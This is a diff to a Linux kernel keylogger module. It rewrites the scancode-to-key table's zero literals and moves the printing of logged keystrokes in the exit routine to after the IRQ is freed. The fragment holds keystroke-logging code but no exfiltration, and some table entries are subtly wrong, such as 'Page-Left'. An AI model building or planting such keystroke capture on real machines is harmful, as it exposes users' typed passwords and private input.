@@ -125,8 +125,8 @@ static void		key_log_clean(void)
 }
 
 static struct key_map key_table[] = {
-	(struct key_map){0x0, 0x0, 0, "NUL", "NUL", false, 0},
-	(struct key_map){0x1, 0x0, 1, "Escape", "Escape", false, 0},
+	(struct key_map){0, 0, 0, "NUL", "NUL", false, 0},
+	(struct key_map){0x1, 0, 1, "Escape", "Escape", false, 0},
 	(struct key_map){'1', '!', 2, "1", "!", false, 0},
 	(struct key_map){'2', '@', 3, "2", "@", false, 0},
 	(struct key_map){'3', '#', 4, "3", "#", false, 0},
@@ -139,7 +139,7 @@ static struct key_map key_table[] = {
 	(struct key_map){'0', ')', 11, "0", ")", false, 0},
 	(struct key_map){'-', '_', 12, "-", "_", false, 0},
 	(struct key_map){'=', '+', 13, "=", "+", false, 0},
-	(struct key_map){0x0, 0x0, 14, "DEL", "DEL", false, 0},
+	(struct key_map){0, 0, 14, "DEL", "DEL", false, 0},
 	(struct key_map){'\t', '\t', 15, "TAB", "TAB", false, 0},
 	(struct key_map){'q', 'Q', 16, "q", "Q", false, 0},
 	(struct key_map){'w', 'W', 17, "w", "W", false, 0},
@@ -154,7 +154,7 @@ static struct key_map key_table[] = {
 	(struct key_map){'[', '{', 26, "[", "{", false, 0},
 	(struct key_map){']', '}', 27, "]", "}", false, 0},
 	(struct key_map){'\n', '\n', 28, "Enter", "Enter", false, 0},
-	(struct key_map){0x0, 0x0, 29, "Control-Left", "Control-Left", false, 0},
+	(struct key_map){0, 0, 29, "Control-Left", "Control-Left", false, 0},
 	(struct key_map){'a', 'A', 30, "a", "A", false, 0},
 	(struct key_map){'s', 'S', 31, "s", "S", false, 0},
 	(struct key_map){'d', 'D', 32, "d", "D", false, 0},
@@ -167,7 +167,7 @@ static struct key_map key_table[] = {
 	(struct key_map){';', ':', 39, ";", ":", false, 0},
 	(struct key_map){'\'', '"', 40, "'", "\"", false, 0},
 	(struct key_map){'\'', '~', 41, "`", "~", false, 0},
-	(struct key_map){0x0, 0x0, 42, "Shift-Left", "Shift-Left", false, 0},
+	(struct key_map){0, 0, 42, "Shift-Left", "Shift-Left", false, 0},
 	(struct key_map){'\\', '|', 43, "\\", "|", false, 0},
 	(struct key_map){'z', 'Z', 44, "z", "Z", false, 0},
 	(struct key_map){'x', 'X', 45, "x", "X", false, 0},
@@ -179,26 +179,26 @@ static struct key_map key_table[] = {
 	(struct key_map){',', '<', 51, ",", "<", false, 0},
 	(struct key_map){'.', '>', 52, ".", ">", false, 0},
 	(struct key_map){'/', '?', 53, "/", "?", false, 0},
-	(struct key_map){0x0, 0x0, 54, "Shift-Right", "Shift-Right", false, 0},
+	(struct key_map){0, 0, 54, "Shift-Right", "Shift-Right", false, 0},
 	(struct key_map){'*', '*', 55, "*", "*", false, 0},
-	(struct key_map){0x0, 0x0, 56, "Alt-Right", "Alt-Right", false, 0},
+	(struct key_map){0, 0, 56, "Alt-Right", "Alt-Right", false, 0},
 	(struct key_map){' ', ' ', 57, "Space", "Space", false, 0},
-	(struct key_map){0x0, 0x0, 58, "Caps-Lock", "Caps-Lock", false, 0},
-	(struct key_map){0x0, 0x0, 71, "Home", "Home", false, 0},
-	(struct key_map){0x0, 0x0, 72, "Arrow-Up", "Arrow-Up", false, 0},
-	(struct key_map){0x0, 0x0, 73, "Page-Up", "Page-Up", false, 0},
+	(struct key_map){0, 0, 58, "Caps-Lock", "Caps-Lock", false, 0},
+	(struct key_map){0, 0, 71, "Home", "Home", false, 0},
+	(struct key_map){0, 0, 72, "Arrow-Up", "Arrow-Up", false, 0},
+	(struct key_map){0, 0, 73, "Page-Up", "Page-Up", false, 0},
 	(struct key_map){'-', '-', 74, "-", "-", false, 0},
-	(struct key_map){0x0, 0x0, 75, "Arrow-Left", "Page-Left", false, 0},
-	(struct key_map){0x0, 0x0, 77, "Arrow-Right", "Arrow-Right", false, 0},
+	(struct key_map){0, 0, 75, "Arrow-Left", "Page-Left", false, 0},
+	(struct key_map){0, 0, 77, "Arrow-Right", "Arrow-Right", false, 0},
 	(struct key_map){'+', '+', 78, "+", "+", false, 0},
-	(struct key_map){0x0, 0x0, 79, "End", "END", false, 0},
-	(struct key_map){0x0, 0x0, 80, "Arrow-Down", "Arrow-Down", false, 0},
-	(struct key_map){0x0, 0x0, 81, "Page-Down", "Page-Down", false, 0},
-	(struct key_map){0x0, 0x0, 82, "Insert", "Insert", false, 0},
+	(struct key_map){0, 0, 79, "End", "END", false, 0},
+	(struct key_map){0, 0, 80, "Arrow-Down", "Arrow-Down", false, 0},
+	(struct key_map){0, 0, 81, "Page-Down", "Page-Down", false, 0},
+	(struct key_map){0, 0, 82, "Insert", "Insert", false, 0},
 	(struct key_map){'.', '.', 83, ".", ".", false, 0},
-	(struct key_map){0x0, 0x0, 92, "Command-Right", "Command-Right", false, 0},
-	(struct key_map){0x0, 0x0, 93, "Menu", "Menu", false, 0},
-	(struct key_map){0x0, 0x0, 0, NULL, NULL, false, 0}
+	(struct key_map){0, 0, 92, "Command-Right", "Command-Right", false, 0},
+	(struct key_map){0, 0, 93, "Menu", "Menu", false, 0},
+	(struct key_map){0, 0, 0, NULL, NULL, false, 0}
 };
 
 #define SCANCODE_ENTER	28
@@ -392,13 +392,13 @@ static void	key_logprint(struct key_log_entry *log, void *ptr)
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
-	key_log_iter(&key_logprint, NULL);
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
 	if (workqueue) {
 		flush_workqueue(workqueue);
 		destroy_workqueue(workqueue);
 	}
+	key_log_iter(&key_logprint, NULL);
 	key_log_clean();
 }
 
